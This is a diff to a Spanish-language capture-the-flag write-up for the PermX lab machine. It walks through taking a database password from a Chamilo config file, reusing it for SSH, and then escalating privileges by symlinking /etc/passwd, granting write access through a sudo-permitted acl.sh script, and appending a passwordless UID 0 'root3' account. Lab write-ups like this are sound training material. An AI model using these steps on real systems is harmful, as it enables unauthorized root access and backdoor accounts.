@@ -102,13 +102,79 @@ sudo nmap -sS -sV -A --min-rate 5000 --open -vvv -Pn 10.10.11.23
 
 
 - Esto nos da resultados de la configuracion de la base de datos
-//
-Database connection settings.
-$_configuration['db_host'] = 'localhost';
-$_configuration['db_port'] = '3306';
-$_configuration['main_database'] = 'chamilo';
-$_configuration['db_user'] = 'chamilo';
-$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
-Enable access to database management for platform admins.
-$_configuration['db_manager_enabled'] = false;
-//
+- 
+> Database connection settings.
+> $_configuration['db_host'] = 'localhost';
+> $_configuration['db_port'] = '3306';
+> $_configuration['main_database'] = 'chamilo';
+> $_configuration['db_user'] = 'chamilo';
+> $_configuration['db_password'] = '03F6lY3uXAP2bkW8';
+> Enable access to database management for platform admins.
+> $_configuration['db_manager_enabled'] = false;
+
+- Nos conectamos por ssh con ese usuario de la db
+
+| ruta | passwd |
+| ssh mtz@permx.htb   | 03F6lY3uXAP2bkW8 |
+
+
+> flag 1 encontrada dentro de user.txt
+
+# Proceso de escalada de privilegios
+
+- Ejecutamos  
+
+> sudo -l 
+
+- Para saber que permisos tenemos para ejecutar como este usuario
+- Vemos un script llamado
+
+
+> acl.sh 
+
+- Este esript nos permite modificar los permisos dentro del path de /home/mtz
+
+- con el comando
+> ln -s /etc/passwd /home/mtz/test 
+- creamos un link entre 
+ > /etc/passwd 
+-  y 
+ > /home/mtz/test 
+- lo que nos va a permitir tener una comunicacion directa con passwd a traves de 
+> /home/mtz/test 
+
+para que tengamos los permisos tenemos que ejecutar el siguiente comando
+
+> sudo /opt/acl.sh mtz rw /home/mtz/test 
+
+- este comando lo que hace es que a traves de 
+
+> sudo /opt/acl.sh  
+
+- le asigna a 
+
+>  mtz 
+
+- los permisos de escritura y lectura
+ 
+> rw 
+
+- al archivo que asignamos con el link  
+
+> /home/mtz/test 
+
+- anterior para poder tener acceso y con 
+
+> echo "root3::0:0:root3:/root:/bin/bash" >> ./test
+ 
+- creamos un root llamado root3 y les damos los mismos permisos de root ya con esto solo ejecutamos 
+
+> su root3 
+
+- y tendremos los privilegios de root 
+
+-realizamos un cd..
+-luego cd ..
+-luego cd root
+-y encontramos la flag dentro de root.txt
+
